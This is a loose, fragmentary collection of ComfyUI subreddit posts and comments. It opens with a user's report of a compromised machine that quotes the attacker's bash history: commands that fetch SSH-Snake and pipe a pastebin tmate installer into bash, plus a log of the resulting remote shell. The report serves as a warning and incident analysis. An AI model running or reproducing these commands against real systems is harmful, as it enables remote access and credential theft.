      "text": "**Root cause has been found, see my latest update at the bottom**\n\nThis is what I saw in my comfyui Terminal that let me know something was wrong, as I definitely did not run these commands:\n\n     got prompt\n    \n    --- Этап 1: Попытка загрузки с использованием прокси ---\n    \n    Попытка 1/3: Загрузка через 'requests' с прокси...\n    \n    Архив успешно загружен. Начинаю распаковку...\n    \n    ✅ TMATE READY\n    \n    \n    SSH: ssh 4CAQ68RtKdt5QPcX5MuwtFYJS@nyc1.tmate.io\n    \n    \n    WEB: https://tmate.io/t/4CAQ68RtKdt5QPcX5MuwtFYJS\n    \n    Prompt executed in 18.66 seconds \n\nCurrently trying to track down what custom node might be the culprit... this is the first time I have seen this, and all I did was run git pull in my main comfyui directory yesterday, not even update any custom nodes.\n\n**UPDATE:**\n\nIt's pretty bad guys. I was able to see all the commands the attacker ran on my system by viewing my .bash_history file, some of which were these:\n\n    apt install net-tools\n    curl -sL https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh -o snake_original.sh\n    TMATE_INSTALLER_URL=\"https://pastebin.com/raw/frWQfD0h\"\n    PAYLOAD=\"curl -sL ${TMATE_INSTALLER_URL} | sed 's/\\r$//' | bash\"\n    ESCAPED_PAYLOAD=${PAYLOAD//|/\\\\|}\n    sed \"s|custom_cmds=()|custom_cmds=(\\\"${ESCAPED_PAYLOAD}\\\")|\" snake_original.sh > snake_final.sh\n    bash snake_final.sh 2>&1 | tee final_output.log\n    history | grep ssh\n\nBasically looking for SSH keys and other systems to get into. They found my keys but fortunately all my recent SSH access was into a tiny server hosting a personal vibe coded game, really nothing of value. I shut down that server and disabled all access keys. Still assessing, but this is scary shit.\n\n**UPDATE 2** - ROOT CAUSE\n\nAccording to Claude, the most likely attack vector was the custom node **[comfyui-easy-use](https://github.com/yolain/ComfyUI-Easy-Use)**. Apparently there is the capability of remote code execution in that node. Not sure how true that is, I don't have any paid versions of LLMs. **Edit:** People want me to point out that this node by itself is normally not problematic. Basically it's like a semi truck, typically it's just a productive, useful thing. What I did was essentially stand in front of the truck and give the keys to a killer. \n\n**More important than the specific node is the dumb shit I did to allow this**: I always start comfyui with the --listen flag, so I can check on my gens from my phone while I'm elsewhere in my house. Normally that would be restricted to devices on your local network, but separately, apparently I enabled DMZ host on my router for my PC. If you don't know, DMZ host is a router setting that basically opens every port on one device to the internet. This was handy back in the day for getting multiplayer games working without having to do individual port forwarding; I must have enabled it for some game at some point. This essentially opened up my comfyui to the entire internet whenever I started it... and clearly there are people out there just scanning IP ranges for port 8188 looking for victims, and they found me. \n\n**Lesson: Do not use the --listen flag in conjunction with DMZ host!**",

For example, there is a weird cap on RAM speed that come from the way WSL2 works. But you can essentially the same WSL2 performance with a docker container inside it.",

It establishes a secure tunnel from a local machine to the internet, allowing others to access that specific terminal remotely via SSH or a web browser.\n\n2. Breakdown of the Log\nThe \"Proxy\" Phase: The script first tried to download the necessary archive (the tmate binary) using a proxy, likely to bypass firewalls or network restrictions.\n\n✅ TMATE READY: This means the program is now running and the tunnel is open.\n\nSSH Address: This is a direct command someone can paste into their terminal to take full control of that command line.\n\nWEB URL: This is a read/write link that allows anyone with the URL to view or interact with the terminal through a browser.\n\n3. Why is this used?\nLegitimate Use: Developers use it for remote pair programming or debugging code running on a remote server that doesn't have a public IP address.\n\nSecurity Risk: If you did not initiate this, this is a major red flag. This is a common technique used by hackers to establish a \"Reverse Shell.\" It gives them a permanent backdoor into the system to execute commands, steal data, or install malware.\n\n\n\nScrub your pc man, they installed some shit. do not use your pc you dont know what that package was or if it is sending them your files, shut down and wipe save nothing. \n\nyou clearly installed a node that was compromised and ran some malicious shit.",

Take this with a pinch of salt and it’s not a confirmation that it’s definitely a safe node. My rig is Linux headless, UFW capped to local only unless I manually disable temporarily for updates (I have a script for it), comfy bound to LAN only, and belt and braces all ports on my router are closed with only reverse proxy and headscale for my own inbound connectivity when out and about, so almost zero chance anyone is getting in, so my checks might not flag something that would appear on a less secure system.",

So much of this mindset is entitlement issues or the fact that most people dont put any thought into anything. There might be some money for maintainers but they would need millions if not billions to baby proof all this stuff.\n\nAlso Claude is an idiot, every dang node is doing local execution which would let anyone get remote execution if they knew even basic stuff. With a minute of thinking about it, no haxor and not much coding skill, I can think of a few easy ways to make it very hard to get caught without someone with some skills looking into it.\n\nI took a look at my easy-use folder and I would be surprised if the person that wrote that code would be dumb enough to print all that sketchy crap to the console and not clean up their tracks. Also that emote in the code screams \"LLM WROTE ME!\" and the author didnt know enough about Comfy to hide it from the console. Id be interested to take a look at the code because my personal use nodes do all kinds of stuff and print not one word to the console. I would bet that whatever Russian chatGPT wrote that crap added a console.log and the prompt engineer didnt know enough to notice. I wrote a hole thing about the easy ways you could own someone from a node but deleted it, no need to give anyone ideas but main thing is that anyone that knows anything would not even consider running custom nodes on a system with access to anything you wouldn't post for the world to see. I just assume my stuff is full of hax and planned accordingly because executing hundreds of scripts from random faceless internet people is obviously a bad idea lol. I care so little I am not even going to bother grepping thru my files to those strings OP posted. Im sure someone that knows basic PC skills already has. If anyone reads this far and does care just post that stuff from OP and ask an LLM to give you some options for how to find those strings and pick the one.",

          "text": "Wow great work! I'm really surprised by how much use this workflow has gotten. This is literally the 3rd or 4th post I've come across that mentioned using the workflow I created a few weeks ago.  \n  \n I really thought it would be of limited use since it was mostly going to be a static camera (due to the lora). There are probably better optimized workflows out there by now which probably haven't gotten as much attention as mine. The workflow  is just a heavily modified workflow of an early and messy \"use your own mp3/audio\" that I found when LTX-2 first came out.   \n  \nBy the way, the steps value in the first pass is actually set really, really high at 25 steps. I meant to update that post with a version 3 to note that you can actually get away with just 15 steps, maybe less in this node. Lowering this allows for higher resolutions or longer videos at certain resolutions. I've seen a few people get up to 40-50s at near 720p if they have your hardware though it is kinda boring watching one shot for that long. I think 15-25 is good for each shot mixed in with non-lip synced audio.   \n\n\nI've taken a bit of a break from Ai generation but it's great to see what people are up to.\n\nhttps://preview.redd.it/gzb5oq6xr4gg1.png?width=724&format=png&auto=webp&s=8098263ea646f6310b29aaef0fd33aad39fee2a1",

Wonder how it will perform with french lip syncing, as Clair obscur has some amazing songs too, though the art for this game is not as abundant as for CP2077, but I'll try to make something out of it ;)\n\nHuge thanks again for your contribution to the community 🫶",

You can't open the logs, the whole thing hangs. When I previously tried it in Nov. 2024 it was appalling slow to generate garbage images. As limited as Fooocus was, it was fast (\\~15-20 sec/image with many steps) and didn't crap out.\n\nI stopped messing with AI stuff after a couple of weeks and decided to step back in with all the new models, but as I said, I can't get ComfyUI to work at all and, no, I'm not reinstalling Win11 to make AI slop.

      "text": "Been obsessed with prompt optimization lately. Wanted to figure out why some prompts produce stunning results while mine look... mid.\n\nSo I collected and analyzed 1,000+ trending image prompts from X to find patterns.\n\n**What I found:**\n\n1. **Negative constraints still matter** — telling the model what NOT to do is effective\n2. **Multi-sensory descriptions help** — texture, temperature, even smell make images more vivid\n3. **Group by content type** — structure your prompt based on scene type (portrait, food, product, etc.)\n\nBonus: Once you nail the above, JSON format isn't necessary.\n\n**So I made a system prompt that does this automatically.**\n\nJust plug it into your LLM prompt optimization node, feed it a simple idea like \"a bowl of ramen\", and it expands it into a structured prompt with all those pro techniques baked in.\n\n￼**How to use in ComfyUI:**\n\nUse any LLM node (e.g., GPT, Claude, local LLM) with this as the system prompt. Your workflow would be:\n\nSimple prompt → LLM Node (with this system prompt) → Image Generation\n\n￼**The System Prompt:**\n\n```\nYou are a professional AI image prompt optimization expert. Your task is to rewrite simple user prompts into high-quality, structured versions for better image generation results. Regardless of what the user inputs, output only the pure rewritten result (e.g., do not include \"Rewritten prompt:\"), and do not use markdown symbols.\n\n---\n\n## Core Rewriting Rules\n\n### Rule 1: Replace Feeling Words with Professional Terms\n\nReplace vague feeling words with professional terminology, proper nouns, brand names, or artist names. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\n| Feeling Words | Professional Terms |\n\n|---------------|-------------------|\n\n| Cinematic, vintage, atmospheric | Wong Kar-wai aesthetics, Saul Leiter style |\n\n| Film look, retro texture | Kodak Vision3 500T, Cinestill 800T |\n\n| Warm tones, soft colors | Sakura Pink, Creamy White |\n\n| Japanese fresh style | Japanese airy feel, Wabi-sabi aesthetics |\n\n| High-end design feel | Swiss International Style, Bauhaus functionalism |\n\nTerm Categories:\n\n- People: Wong Kar-wai, Saul Leiter, Christopher Doyle, Annie Leibovitz\n\n- Film stocks: Kodak Vision3 500T, Cinestill 800T, Fujifilm Superia\n\n- Aesthetics: Wabi-sabi, Bauhaus, Swiss International Style, MUJI visual language\n\n### Rule 2: Replace Adjectives with Quantified Parameters\n\nReplace subjective adjectives with specific technical parameters and values. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\n| Adjectives | Quantified Parameters |\n\n|------------|----------------------|\n\n| Professional photography, high-end feel | 90mm lens, f/1.8, high dynamic range |\n\n| Top-down view, from above | 45-degree overhead angle |\n\n| Soft lighting | Soft side backlight, diffused light |\n\n| Blurred background | Shallow depth of field |\n\n| Tilted composition | Dutch angle |\n\n| Dramatic lighting | Volumetric light |\n\n| Ultra-wide | 16mm wide-angle lens |\n\n### Rule 3: Add Negative Constraints\n\nAdd explicit prohibitions at the end of prompts to prevent unwanted elements.\n\nCommon Negative Constraints:\n\n- No text or words allowed\n\n- No low-key dark lighting or strong contrast\n\n- No high-saturation neon colors or artificial plastic textures\n\n- Product must not be distorted, warped, or redesigned\n\n- Do not obscure the face\n\n### Rule 4: Sensory Stacking\n\nGo beyond pure visual descriptions by adding multiple sensory dimensions to bring the image to life. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\nSensory Dimensions:\n\n- Visual: Color, light and shadow, composition (basics)\n\n- Tactile: \"Texture feels tangible\", \"Soft and tempting\", \"Delicate texture\"\n\n- Olfactory: \"Aroma seems to penetrate the frame\", \"Exudes warm fragrance\"\n\n- Motion: \"Surface gently trembles\", \"Steam wisps slowly descending\"\n\n- Temperature: \"Steamy warmth\", \"Moist\"\n\n### Rule 5: Group and Cluster\n\nFor complex scenes, cluster similar information into groups using subheadings to separate different dimensions.\n\nGrouping Patterns:\n\n- Visual Rules\n\n- Lighting & Style\n\n- Overall Feel\n\n- Constraints\n\n### Rule 6: Format Adaptation\n\nChoose appropriate format based on content complexity:\n\n- Simple scenes (single subject): Natural language paragraphs\n\n- Complex scenes (multiple elements/requirements): Structured groupings\n\n---\n\n## Scene Adaptation Guide\n\nIdentify scene type based on user intent and choose appropriate rewriting strategy. Note: the examples below are for understanding only — do not reuse them. Create original expansions based on user descriptions.\n\n| Scene Type | Recommended Terms | Recommended Parameters | Common Constraints |\n\n|------------|------------------|----------------------|-------------------|\n\n| Product Photography | Hasselblad, Apple product aesthetics | Studio lighting, high dynamic range | No product distortion, no text watermarks |\n\n| Portrait Photography | Wong Kar-wai, Annie Leibovitz | 90mm, f/1.8, shallow depth of field | Maintain realistic facial features, preserve identity |\n\n| Food Photography | High-end culinary magazine style | 45-degree overhead, soft side light | No utensil distractions, no text |\n\n| Cinematic | Christopher Doyle, Cinestill 800T | 35mm anamorphic lens, Dutch angle | No low-key dark lighting (unless requested) |\n\n| Japanese Style | Japanese airy feel, Wabi-sabi aesthetics | High-key photography, diffused light | No high-saturation neon colors |\n\n| Design Poster | Swiss International Style, Bauhaus | Grid system, minimal color palette | Clear information hierarchy |\n\n---\n\n## Example\n\n**User Input:\\*\\*\n\na portrait with cinematic feel\n\n**Rewritten Prompt:\\*\\*\n\nCinematic portrait photography, shot through rain-soaked glass at a dimly lit restaurant at night.\n\nVisual Style:\n\nWong Kar-wai and Saul Leiter aesthetics. Deep saturated colors, heavy shadows. Shot with 90mm lens, f/1.8, Kodak Vision3 500T film grain.\n\nLighting & Atmosphere:\n\nNeon green and red city lights refracting through raindrops in the foreground. Soft focus, dreamy, emotionally evocative. The air is filled with moisture, loneliness, and nostalgia.\n\nConstraints:\n\nMaintain realistic facial features. Do not alter identity characteristics.\n\n```\n\n---\n\n￼**The dataset is open source too** — 1,100+ prompts with image links, all in JSON:\n\n👉 [ https://github.com/jau123/nanobanana-trending-prompts ](https://github.com/jau123/nanobanana-trending-prompts)\n\nLiveDemo 👉 [meigen.ai](https://www.meigen.ai)\n\nLet me know if you try it out.

          "text": "If you don't mind a bit of criticism, I think your methodology and the conclusions you have drawn are a bit flawed. I appreciate the drive to learn it and share, but you've hit a couple traps that are super common when learning image gen.\n\nThis bit immediately caught my attention:\n\n>So I collected and analyzed 1,000+ trending image prompts from X to find patterns.\n\nSorry, but you didn't collect 1000+ trending prompts. Trending prompts don't exist. What you've done is collect 1000+ trending images and grabbed the prompts from those. They're similar, but they aren't the same thing. \n\nRelying on trending images means you are only sourcing the most attention-grabbing results with no regard for how closely the models followed the prompts. Wanna know what draws the most attention in the AI space online? Your .json of trending prompts contains 479 mentions of the keyword \"woman\", 376 mentions of the word \"girl\", and 212 mentions of the word \"female\". \n\nPeople don't care about the prompt, they care about a pretty picture, and models are experts at delivering a pretty picture. That's basically all they're good for. \n\n[Take this image from Nanobanana Pro](https://i.postimg.cc/dqSZtvNj/nano-4.jpg). Looks cool, right? Imagine I'm some guy on X with a following, and this got a couple hundred likes and retweets, enough for it to hit your scrape. It must have a good prompt for it to be so popular, right?\n\nWell, the prompt for that image is:\n\n>Generate a cinematic film still using the following random tags as inspiration:\n\n>inr, tae, repair, ilovemy, eoin, hurricane, allo, dianne, baddest, elondon, turk, grove, hawk, cabine, bonnet, genuine, big, flashbacks, nare, kavanaugh, ellis, boogie, pies, vandalism, bham, cassidy, schal, rout, mol\n\n>You must not include any text.\n\nIt's clear the prompt is nonsense, but the model made a sick image anyway. That's what they do, they take any input and try their best to turn chicken shit into chicken salad. \n\nThat's a good thing, but that strength also leads a lot of people astray. If you have found any similarities between the prompts, try not to draw the conclusion that \"this is in the prompt, the image is good, therefore the prompt must be good.\" \n\nPeople naturally follow the herd and try looking online to find pretty images to see how it's done, they find one and copy the keywords, but the image they've copied *also* copied those keywords from a different image, which in turn copied from another image, and so on, creating a feedback loop of the blind leading the blind. \n\nAsk any of the prompters in the chain why their image is good, they'll respond with \"It's the prompt.\" Ask them *why* they've included what they have in the prompt and you'll get some variation of \"Because it makes the image better.\" \n\nSeriously, the .json dataset is comprised of tons of overused and unnecessary keywords that have been hanging around long past their use-by date and will barely make a difference in the generation. There are 1232 mentions of the keyword \"realistic\" of which 304 are \"photorealistic\" and 191 are \"ultra-realistic\", 130 \"ultra-detailed\", 8 \"best quality\", 29 \"masterpiece\", 55 \"4k\", 308 \"8k\", hell, there's even 1 \"artstation\" that's made its way through. \n\nWhat your dataset primarily shows is the model is good at making pretty images. What it doesn't show is how to make particular pretty images.\n\nNow, I'm not saying all your recommendations are wrong necessarily. A couple look good, others do not (I didn't think I'd have to write this, but don't prompt for smell, or taste, or sound, or touch. These models are trained on visuals, so use visual descriptors.) \n\nWhat I'm saying is you can't draw conclusions based on the popularity of an image. Again, there's more than 1200 mentions of realistic in your dataset, which must mean it's a good keyword since it's so popular, right? No, if you want a realistic image just include the medium in the prompt. An amateur photo, a cinematic film still, a polaroid, whatever. You only need \"realistic\" to reinforce the medium if the rest of the prompt is pushing towards an unrealistic style.\n\nSorry If I came off like a dick at any point here, it really is super cool you're doing this and sharing it. It's hard to be thorough and diplomatic at the same time when trying to point out flaws in someone's idea. \n\nSo I don't look like a complete dickhead just here to shit on someone else's effort, here's a site that will help you out if you feel like scraping more popular images and their prompts: https://civitlab.devix.pl/ It's the civit gallery, but much more easily searchable.",

If it can be changed on the fly do I put one of these nodes in front of each ksampler?   \n3.  Is there any added time for the first one while its collecting the data? \n\nThanks!",

SageAttention2 itself has multiple variants / kernels (and there are also SageAttention2++ style variants depending on what you installed), and sometimes FlashAttention (2/3) or another backend can win on certain GPUs / shapes.\n\nSo the real answer is: could be 0%, could be noticeable and the whole point of the node is to benchmark your setup once and stop guessing.",

The only thing persisted to disk is the benchmark cache (`benchmark_db.json`) so future runs can pick the same winner instantly.\n\nYou also do not need to add any separate SageAttention / Flash / xFormers nodes to the workflow. This node detects what’s installed, benchmarks only the available backends, and applies the fastest (or your forced choice). If a backend isn’t installed it’s skipped during benchmarking, and if you force a backend that’s not available it falls back to PyTorch SDPA and reports it.",

In practice, strong “tone/emotion” prompts often lead to **voice drift** or only subtle/inconsistent emotion changes. If you need consistent emotions, the usual workaround is **separate reference samples per emotion/style** (or using a TTS model that explicitly supports expressive conditioning).\n\nWe’re also keeping an eye on Qwen3-TTS models updates, if/when reliable emotion/style control for cloned voices becomes available (and fits our integration), we’ll evaluate it and ship support in Rebit as soon as we can.",

      "text": "With a recent upgrade to a 5090, I can start training loras with hi-res images containing lots of tiny details. Reading through [this lora training guide](https://civitai.com/articles/7777?highlight=1763669) I wondered if training on high resolution images would work for SDXL or would just be a waste of time. That led me down a rabbit hole that would cost me 4 hours, but it was worth it because I found [this blog post](https://medium.com/@efrat_taig/vae-the-latent-bottleneck-why-image-generation-processes-lose-fine-details-a056dcd6015e) which very clearly explains why SDXL always seems to drop the ball when it comes to \"high frequency details\" and why training it with high-quality images would be a waste of time if I wanted to preserve those details in its output.\n\nThe keyword I was missing was the number of **channels** the VAE model uses. The higher the number of channels, the more detail that can be reconstructed during decoding. SDXL (and SD1.5, Qwen) uses a 4-channel VAE, but the number can go higher. When Flux was released, I saw higher quality out of the model, but far slower generation times. That is because it uses a 16-channel VAE. It turns out Flux is not slower than SDXL, it's simply doing more work, and I couldn't properly appreciate that advantage at the time.\n\nFlux, SD3 (which everyone clowned on), and now the popular Z-Image all use 16-channel VAEs which have lower compression than SDXL, which allows them to reconstruct higher fidelity images. So you might be wondering: why not just use a 16-channel VAE on SDXL? The answer is it's not compatible, the model itself will not accept latent images at the compression ratios that 16-channel VAEs encode/decode. You would probably need to re-train the model from the ground up to give it that ability.\n\nHigher channel count comes at a cost though, which materializes in generation time and VRAM. For some, the tradeoff is worth it, but I wanted crystal clarity before I dumped a bunch of time and energy into lora training. I will probably pick 1440x1440 resolution for SDXL loras, and 1728x1728 or higher for Z-Image.\n\nThe resolution itself isn't what the model learns though, that would be the relationships between the pixels, which can be reproduced at ANY resolution. The key is that some pixel relationships (like in text, eyelids, fingernails) are often not represented in the training data with enough pixels either for the model to learn, or for the VAE to reproduce. Even if the model learned the concept of a fishing net and generated a perfect fishing net, the VAE would still destroy that fishing net before spitting it out.\n\nWith all of that in mind, the reason why early models sucked at hands, and full-body shots had jumbled faces is obvious. The model was doing its best to draw those details in latent space, but the VAE simply discarded those details upon decoding the image. And who gets blamed? Who but the star of the show, the model itself, which in retrospect, did nothing wrong. This is why closeup images express more detail than zoomed-out ones.\n\nSo why does the image need to be compressed at all? Because it would be way too computationally expensive to generate full-resolution images, so the job of the VAE is to compress the image into a more manageable size for the model to work with. This compression is always a factor of 8, so from a lora training standpoint, if you want the model to learn any particular detail, that detail should still be clear when the training image is reduced by 8x or else it will just get lost in the noise.\n\n[The more channels, the less information is destroyed](https://preview.redd.it/ltrsxhyytigg1.png?width=324&format=png&auto=webp&s=5d871b7f22f3066adf852063e1381c6663ff0c20)",

Load your reference audio (5-30 seconds of someone speaking)\n2. ASR auto-transcribes it (no more typing out what they said)\n3. TTS clones the voice and speaks whatever text you want\n\nBoth node packs auto-download models on first use. Works with 52 languages.\n\n**Links:**\n\n* **Qwen3-TTS nodes:** [https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)\n* **Qwen3-ASR nodes:** [https://github.com/DarioFT/ComfyUI-Qwen3-ASR](https://github.com/DarioFT/ComfyUI-Qwen3-ASR)\n\nModels used:\n\n* ASR: Qwen/Qwen3-ASR-1.7B (or 0.6B for speed)\n* TTS: Qwen/Qwen3-TTS-12Hz-1.7B-Base\n\nThe TTS pack also supports preset voices, voice design from text descriptions, and fine-tuning on your own datasets if you want a dedicated model.",

I couldn't setup workflows correctly, or fix node issues, or understand what model goes where, what loras are, didn't know how to work with venv/pip. The post from me is [here](https://www.reddit.com/r/comfyui/comments/1qhf9i7/need_a_simple_nsfw_workflow_and_help_with/) (somewhat frustrated).\n\nThe name shouldn't really be comfyui (maybe it's a joke), maybe it should be something like \"model graph composer with a pretentious name to deceive the masses\". I dunno.\n\nEight days later, after a bunch of tutorials, crawling civit and hugging-face having setup multiple t2i, i2i, i2v workflows (didn't create from scratch, all were done on other's workflows as bases), I have my first \"production\". (Flux NSFW checkpoint for getting the model exactly to my liking from a significantly different source photo, this alone took 50+ iterations to get the face, figure I wanted, including iterations with QWEN rapid AIO nsfw - so many hits and misses because I'm a noob).\n\nScene link (deletes in 7 days): [LimeWire File Sharing](https://limewire.com/d/v9yCp#TNaPZ941ig)\n\nIt feels UNREAL to see this scene come to life, with the woman almost identical to what I had imagined for so long (the ethnic composition of her face needs a tad bit more Armenian phenotype and proportions, but it is hard to pull off atm).\n\nNot a great piece of work and doesn't hold a candle to what I see on civit, but I'm patting myself on the back for a baby-step achievement. More to come, as I put this woman to work (and upgrade to an OC 5090 asap 😂)\n\nNext few learning goals: Achieving extreme photo-realism to the extent that current models and loras allow it.",

Maybe some can get distilled, but with a domain specific distilled model you can probably still have diverse outputs if you are focusing on anime, just realistic etc. this way Loras can be a bit more universal and we don't need to train the same one three times for different bases.\n\nMaybe there are way smarter people who already have answers, but while I have finetuned SDXL models, I don't even know how to start with something like Z Image, probably entirely different ball game. It might take some time for the base tools to be developed, experiments on how to best fine-tune etc, and that will cost money so I don't expect a bunch to be on it right away. \n\nI think we'll have fun with the standard z image models for the next 3-6months then see some usable finetuned coming out.\n\nI am envious of NovelAI cause it does anime generation stunningly and I feel like Z Image has the potential, but it needs a whole bunch of anime knowledge. Maybe that's one fine-tune I can pursue once the tools have been established. Get it to know each anime intimately like NovelAI from 2026 right down to the 60s.\n\nAnd when I say fine tune I don't mean just Loras. Although Loras are great for a lot of things, sometimes you need the model to be foundationally trained towards things like this",

The Repeat Latent Batch is not needed technically in either image node, that was for trying to work with setting batches in case people want to batch images at once versus batching multiple jobs.\n\nThe only word for the wise here is that .50 is middle ground for blending, .50-1 and 0-.50 leans you into either image. The main reason for creating my weighted node was more of similar way, but making it simple.\n\nhttps://preview.redd.it/m3bnu6r34wgg1.png?width=1718&format=png&auto=webp&s=905080b793f8102d74ad4fe3ff43ecc5b35bb729",
